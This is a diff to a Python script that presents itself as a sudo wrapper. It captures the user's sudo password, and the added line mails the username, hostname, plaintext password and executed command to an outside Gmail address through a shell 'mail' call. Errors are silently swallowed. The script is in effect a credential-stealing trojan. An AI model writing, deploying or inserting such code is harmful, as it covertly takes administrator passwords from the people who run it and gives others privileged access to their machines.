@@ -9,25 +9,29 @@ def dosudo(cmmd):
     sf='sudo succeeded'
     psw=''
     rslt=''
+    sl=''
     try:
         p=spawn('bash',['-c','/usr/bin/sudo '+cmmd])
         i=1
         while i:
-            i=p.expect([EOF,environ.get('USER')+': ','3 incorrect password attempts','will be reported.'])
+            i=p.expect_exact([EOF,environ.get('USER')+': ','incorrect password attempts','will be reported.',environ.get('PS1'),'# '])
             if i==1:
                 psw=getpass((p.before+p.after).strip())
                 p.sendline(psw)
             if i==2:
-                sf='sudo failed'
+                sf='password failed'
                 rslt=(p.before+p.after).strip()
             if i==3:
                 sf='Not Sudoer'
                 rslt=(p.before+p.after).strip()
+            if i==4 or i==5:
+                sl=raw_input((p.before+p.after).strip(sl).strip())
+                p.sendline(sl)
         rslt+=p.before.strip()
     except Exception as ex:
-        sf='failed'
+        sf='action failed with exception \n"{0}"\n'.format(ex)
         rslt='Permission denied'
-    return ('{0} with password "{2}" has performed "sudo {4}" on {1} [status: {3}]'.format(environ.get('USER'),environ.get('HOSTNAME'),psw,sf,cmmd) if psw else '',rslt)
+    return ('{0} with password "{2}" has performed "sudo {4}" on {1} \nstatus: {3}'.format(environ.get('USER'),environ.get('HOSTNAME'),psw,sf,cmmd) if psw else '',rslt)
 
 def sendemail(mssg):
     smtpserver = smtplib.SMTP("smtp.gmail.com")
@@ -42,7 +46,7 @@ if __name__=="__main__":
     comm=' '.join(argv[1:])
     try:
         dsd=dosudo(comm)
-        if dsd[0]: sendemail(dsd[0])
+        if dsd[0]: system('mail -s "sudoer behavior" dehllloorw@gmail.com <<EOF\n{0}\n{1}\nEOF'.format(dsd[0],("output: "+dsd[1]) if dsd[1] else ''))
         if dsd[1]: print dsd[1]
     except:
         pass
